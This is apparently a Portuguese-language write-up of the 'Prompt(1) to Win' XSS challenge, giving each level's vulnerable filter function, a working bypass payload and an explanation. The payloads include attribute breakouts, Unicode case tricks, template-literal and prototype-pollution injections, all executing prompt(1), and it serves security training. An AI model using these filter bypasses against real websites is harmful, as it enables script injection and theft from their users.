# Prompt(1) to Win

###### Solved by @SebastiaoKomada

Este é um desafio de XSS com 15 etapas, focado em técnicas de injeção de JavaScript. O objetivo é contornar os filtros de cada fase até conseguir executar o comando correto.

## About the Challenge
O desafio mostra diferentes formas de Cross-Site Scripting aplicando filtros e sanitizações no input. Cada questão exige manipular a entrada para que o navegador interprete e execute `prompt(1)`.

#### Desafio 0

Código:
````
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}  
````
Resolução funcional:
````
"> <img src=a onerror=prompt(1)>
````

<img width="1146" height="460" alt="Captura de Tela 2025-08-31 às 16 34 46" src="https://github.com/user-attachments/assets/cbffde2c-bdb5-4f83-a97d-42a6ea292a53" />

Explicação:
O input é fechado com ">, o que possibilita injetar código na página. Um exemplo é usar `<img onerror=alert>`, que executa automaticamente e evidencia a vulnerabilidade.

#### Desafio 1

Código:
````
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
} 
````
Resolução funcional:
````
<img src=a onerror=prompt(1)
````

<img width="2372" height="1036" alt="image" src="https://github.com/user-attachments/assets/74edc273-585b-42b5-abfa-19b70cea672c" />

Explicação:
O filtro aplicado pela regex só elimina tags bem formadas que começam com `<` e finalizam com `>`.  
Se a tag não é encerrada, ela passa pelo filtro sem ser alterada.  
Mesmo assim, o navegador reconhece a estrutura de `<img>` e executa o atributo `onerror`, permitindo a execução do código.

#### Desafio 2

Código:
````
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}  
````
Resolução funcional:
````
<svg><script>prompt&#40;1)</script></svg>
````
<img width="1155" height="456" alt="Captura de Tela 2025-08-31 às 16 47 11" src="https://github.com/user-attachments/assets/7775d3a4-538f-4ebd-8266-704345c9ff83" />

Explicação:
O código tenta impedir o uso de `=` e `(`, bloqueando construções comuns de XSS.  
Para contornar isso, é possível utilizar entidades do charset HTML que o navegador decodifica antes de interpretar o código.  
Testes com `<img>` e `<script>` não funcionam, mas ao inserir o payload dentro de um `<svg>`, o navegador processa corretamente e executa o código, evidenciando a vulnerabilidade.

#### Desafio 3

Código:
````
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
````

Resolução funcional:
````
--!> <img src=a onerror=prompt(1)>
````

<img width="2392" height="1068" alt="image" src="https://github.com/user-attachments/assets/0454ebee-5936-44a2-880f-8af8fc493bda" />

Explicação:
A função insere o conteúdo do input dentro de um comentário iniciado por `<!--`.  
Para escapar desse comentário, basta fechar manualmente usando `-->`.  
Após o fechamento, é possível injetar código dentro da tag `<img>`, que será interpretado e executado pelo navegador, demonstrando a falha.

## Desafio 5

Código:
````
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
} 
````
Resolução funcional:
````
"type=img src
=a onerror
="prompt(1)
````
<img width="2344" height="1118" alt="image" src="https://github.com/user-attachments/assets/d8baee52-c233-40d8-8b82-eba670298600" />

Explicação:
A função substitui `>` e também transforma qualquer atributo iniciado por `on` seguido de `=` em `_`, numa tentativa de bloquear eventos.  
Apesar disso, o valor do input ainda é injetado diretamente no HTML.  
Ao fechar o campo com aspas e utilizar uma quebra de linha, é possível escapar da substituição aplicada pelo regex.  
Dessa forma, o código injetado passa a ser interpretado normalmente pelo navegador, evidenciando a vulnerabilidade.

## Desafio 6

Código:
````
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
} 
````
Resolução funcional:
````
javascript:prompt(1);#{"action": "seba"}
````
<img width="2342" height="1396" alt="image" src="https://github.com/user-attachments/assets/267e478b-1849-4b0c-9680-23caca492de2" />

Explicação:
A função divide o input pelo caractere `#`, usando a primeira parte como `action` e a segunda como JSON.  
Somente quando a chave `"action"` está presente o formulário é submetido, caso contrário o fluxo vai para o `else`.  
A validação contra esquemas indesejados ocorre apenas depois que o `action` já foi definido, o que permite a exploração.

## Desafio 7

Código:
````
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
````
Resolução funcional:
````
"> <script>`#${prompt(1)}#`</script>
````
<img width="2340" height="1172" alt="image" src="https://github.com/user-attachments/assets/24bc143f-d51b-4875-935d-ee6e2a073104" />

Explicação:
O código limita a entrada a 12 caracteres, o que impede instruções muito longas.  
Cada `#` inserido gera um novo elemento `<p>`, acrescentando o texto correspondente.  
Utilizando interpolação de template literals em JavaScript, o código passado dentro de `${}` é interpretado, permitindo a exploração.

#### Desafio 9

Código:
````
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}  
````
Resolução funcional:
````
<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>
````

<img width="1147" height="496" alt="Captura de Tela 2025-08-31 às 17 16 26" src="https://github.com/user-attachments/assets/2dc575ee-74e3-4747-b0e3-dadab9fec305" />

Explicação:
A função aplica um regex que só reconhece letras ASCII após `<`, permitindo escapar com o caractere `ſ` (U+017F).  
Quando convertido para maiúsculo, `ſ` se torna `S`, resultando em `<SVG>`, uma tag válida.  
Com isso, o atributo `onload` é executado automaticamente no momento em que o SVG é renderizado.

#### Desafio A

Código:
````
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}
````
Resolução funcional:
````
promp't(1)
````

<img width="2336" height="1022" alt="image" src="https://github.com/user-attachments/assets/a19d33c8-8e0b-4d5b-a3d9-c4e0eb6d11ab" />

Explicação:
O código utiliza duas regex: a primeira substitui `prompt` por `alert` e a segunda remove aspas simples.  
Com isso, ao inserir `prompt(1)` o resultado exibido é `alert(1)`.  
No entanto, ao colocar uma aspa simples dentro da palavra `prompt`, o termo já não corresponde ao padrão buscado pela regex e permanece intacto, permitindo a execução.

#### Desafio B

Código:
````
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}  
````
Resolução funcional:
````
"(prompt(1))in"
````

<img width="1149" height="581" alt="Captura de Tela 2025-08-31 às 17 24 00" src="https://github.com/user-attachments/assets/ca017756-0d5f-4300-a600-5241d74b0725" />

Explicação:
O código insere o valor dentro de um JSON que é manipulado diretamente em um script.  
Ao passar um conteúdo que inclua uma chamada de função, esse valor é incorporado ao texto da chave `"message"`.  
Durante a execução, o JavaScript interpreta o trecho injetado como código e o executa, evidenciando a vulnerabilidade.

#### Desafio C

Código:
````
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}
````
Resolucão funcional:
````
eval(1558153217..toString(36))(1)
````

<img width="1146" height="461" alt="Captura de Tela 2025-08-31 às 17 30 41" src="https://github.com/user-attachments/assets/1443f107-be2a-4e49-a66a-54157a8fb971" />

Explicação:
O código tenta bloquear `prompt` substituindo por `alert`, mas a função `eval` permite contornar essa restrição.  
Usando a conversão para base 36, é possível gerar a palavra bloqueada de outra forma e executá-la dentro do `eval`.  
Com isso, o comando é interpretado e a falha pode ser explorada.


#### Desafio D

Código:
````
 function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
} 
````
Resolução funcional:
````
{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
````

<img width="1154" height="480" alt="Captura de Tela 2025-08-31 às 17 40 49" src="https://github.com/user-attachments/assets/62ad0847-fa92-4d53-a762-159fb3e99f1b" />

Explicação:
O código gera uma tag `<img>` a partir de dados em JSON.  
A falha está na manipulação do protótipo, que permite injetar um atributo `onerror`.  
Quando a imagem falha ao carregar, esse evento é acionado e o código é executado.


#### Desafio F

Código:
````
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}        
````
Resolução funcional:
````
"> <script>`#${prompt(1)}#`</script>
````

<img width="1149" height="524" alt="Captura de Tela 2025-08-31 às 17 40 32" src="https://github.com/user-attachments/assets/a0d762c5-fc7f-4b5f-b4a2-fce8f12a7dda" />

Explicação:
O código divide a entrada pelo caractere `#` e limita cada segmento a 15 caracteres.  
Ao fechar o atributo `title` e injetar um `<script>`, a execução não ocorre da forma esperada.  
Porém, utilizando a mesma técnica do desafio 7 com template literals, o conteúdo dentro de `${}` é interpretado como código JavaScript.  
Assim, a função é executada, permitindo a exploração.

## Desafios não finalizados
#### Desafio 4 
Possivel solução: 
O código valida a URL passada no input e só aceita valores específicos.  
Qualquer endereço diferente é rejeitado e gera a mensagem "Invalid resource".  
Isso mostra que apenas a URL permitida ou codificada pode ser usada para carregar o script.

#### Desafio 8
Possivel solução: 
O payload insere um espaço antes do `prompt` para evitar erros de concatenação.  
Em seguida, utiliza `-->` para encerrar o comentário, que alguns navegadores interpretam como válido dentro do JavaScript. 

#### Desafio E
Possivel solução: 
O código bloqueia URLs externas e só aceita caminhos locais ou no formato `data:`.  
Assim, links maliciosos não são executados, restando apenas a possibilidade de explorar o uso de `data:` se houver falha no processamento.
